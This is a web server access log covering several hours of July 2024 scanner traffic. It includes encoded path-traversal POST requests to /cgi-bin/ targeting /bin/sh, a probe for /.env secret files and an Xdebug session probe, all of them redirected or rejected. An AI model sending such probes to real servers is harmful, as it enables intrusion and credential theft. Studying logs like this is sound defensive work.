80.82.77.202 - - [04/Jul/2024:22:49:26 +0000] "GET /aaa9 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
80.82.77.202 - - [04/Jul/2024:22:49:27 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x15\xD1\xD8\xFF5/$\xE6\x1EB\x0C\x80\x09hNh\xAA\xA3\xA4\x01\x02`$4KF\xC35\x058\x11\xC0 \x15\xBC\x93t\xFE~-\x97\xB3\xBA\xB1\x96Zt\x1C\xC8\x05\xDB\xF0\xB5a\x14\xB2T\x8DC\x96dw\xDBM\x86\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
80.82.77.202 - - [04/Jul/2024:22:49:27 +0000] "GET /aab9 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
80.82.77.202 - - [04/Jul/2024:22:49:46 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF5\xB2\x980\xC0#\xFA3\xB8uw\x00lu\xCE\xD7\x8E.hW\xD0\x8F\xC42\xC6\xA4f\xA0@T=\x13 \xF7\x02\x0CPM" 400 154 "-" "-"
80.82.77.202 - - [04/Jul/2024:22:49:46 +0000] "GET /aaa9 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
80.82.77.202 - - [04/Jul/2024:22:49:46 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xBC\xF3b\xF1\x94\xF4;\xE3" 400 154 "-" "-"
80.82.77.202 - - [04/Jul/2024:22:49:47 +0000] "GET /aab9 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
185.224.128.43 - - [04/Jul/2024:22:59:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
140.246.143.202 - - [04/Jul/2024:23:00:23 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
140.246.143.202 - - [04/Jul/2024:23:00:39 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 154 "-" "-"
46.19.143.66 - - [04/Jul/2024:23:04:25 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [04/Jul/2024:23:11:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
87.236.176.55 - - [04/Jul/2024:23:49:30 +0000] "GET / HTTP/1.1" 301 166 "http://hanisntsolo.com:1081" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.247 - - [04/Jul/2024:23:49:32 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
198.235.24.69 - - [04/Jul/2024:23:52:12 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xFA\xDCP\xFB\x82}R\x1Ds\x18\x97\xDF\xA5\xB7\x91\xAF\x85" 400 154 "-" "-"
198.235.24.69 - - [04/Jul/2024:23:52:12 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03PV\xC2\xFC@\xB2\x09\x9Eq\x01\x9CJ\x05j\x9C:" 400 154 "-" "-"
109.205.213.198 - - [04/Jul/2024:23:58:34 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
193.32.162.96 - - [04/Jul/2024:23:59:34 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.32.162.96 - - [04/Jul/2024:23:59:35 +0000] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
149.50.103.48 - - [05/Jul/2024:00:04:38 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [05/Jul/2024:00:06:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
149.50.103.48 - - [05/Jul/2024:00:10:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
162.216.149.163 - - [05/Jul/2024:00:11:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
46.19.143.66 - - [05/Jul/2024:00:16:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.83.197 - - [05/Jul/2024:00:24:59 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
83.97.73.245 - - [05/Jul/2024:00:25:14 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.249.48.202 - - [05/Jul/2024:00:31:26 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [05/Jul/2024:01:01:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
